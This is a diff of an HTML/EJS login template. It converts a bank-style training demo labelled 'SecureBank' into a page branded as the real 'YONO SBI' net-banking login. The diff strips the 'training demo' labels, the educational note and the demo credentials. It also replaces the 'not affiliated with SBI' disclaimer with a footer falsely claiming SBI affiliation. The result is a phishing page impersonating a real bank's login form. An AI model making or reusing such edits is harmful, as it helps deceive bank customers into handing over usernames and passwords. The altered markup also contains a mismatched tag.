@@ -1,12 +1,12 @@
 <!doctype html>
 <html lang="en">
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login | SecureBank Training</title><link rel="stylesheet" href="/css/sbi-inspired.css"></head>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login |  YONO SBI </title><link rel="stylesheet" href="/css/sbi-inspired.css"></head>
 <body class="login-page">
-<header class="login-utility"><div><strong>Personal Banking</strong><span>Corporate website</span><span>Get Help</span></div><div><span>WhatsApp</span><span>English ▾</span><span>A-</span><span>A</span><span>A+</span></div></header>
-<header class="login-header"><a class="login-brand" href="/"><span>yono</span><i>●</i><b>SecureBank</b><small>NET-BANKING • TRAINING DEMO</small></a><div class="login-header-note">Educational portal</div></header>
+<header class="login-utility"><div><strong>Personal Banking</strong><span></span><span>Get Help</span></div><div><span></span><span>English ▾</span><span>A-</span><span>A</span><span>A+</span></div></header>
+<header class="login-header"><a class="login-brand" href="/"><span>yono</span><i>●</i><b>SBI</b><big>NET-BANKING </small></a><div class="login-header-note"></div></header>
 <nav class="login-nav"><a class="active" href="/auth/login">Home</a><a href="/auth/login">Accounts &amp; Deposits</a><a href="/auth/login">Loans</a><a href="/auth/login">Cards</a><a href="/auth/login">Investments</a></nav>
 <main class="login-content" id="main">
-  <section class="login-welcome"><div class="hello">Hello!</div><h1>Welcome to the world of SecureBank</h1><h3>Are you a new user?</h3><p>Choose one of the following options if you are a new user</p><div class="new-user-actions"><a href="/auth/register" class="primary-pill">Register Now</a><a href="/auth/register" class="outline-pill">Activate Username</a></div><p class="account-note">Don’t have an account with SecureBank? <a href="/auth/register">Open Now</a></p></section>
+  <section class="login-welcome"><div class="hello">Hello!</div><h1>Welcome to the world of YONO SBI</h1><h3>Are you a new user?</h3><p>Choose one of the following options if you are a new user</p><div class="new-user-actions"><a href="/auth/register" class="primary-pill">Register Now</a><a href="/auth/register" class="outline-pill">Activate Username</a></div><p class="account-note">Don’t have an account with SBI? <a href="/auth/register">Open Now</a></p></section>
   <section class="login-card">
     <h2>Username / Password</h2>
     <% if (typeof error !== "undefined") { %><div class="login-error"><%= error %></div><% } %>
@@ -17,8 +17,7 @@
       <div class="captcha-row"><label class="material-field">Enter Captcha<input name="captcha" required autocomplete="off"></label><div class="captcha-box"><%= captcha %></div><button type="button" class="refresh" onclick="location.reload()" aria-label="Refresh captcha">↻</button></div>
       <button class="big-login" type="submit">LOGIN <span>›</span></button>
     </form>
-    <div class="demo-box"><strong>Training demo</strong><span>Customer ID: <b>demo</b> &nbsp; Password: <b>Demo@12345</b></span></div>
   </section>
 </main>
-<footer class="login-footer">SecureBank educational project — not affiliated with or operated by SBI.</footer>
+<footer class="login-footer"> — affiliated by SBI.</footer>
 </body></html>
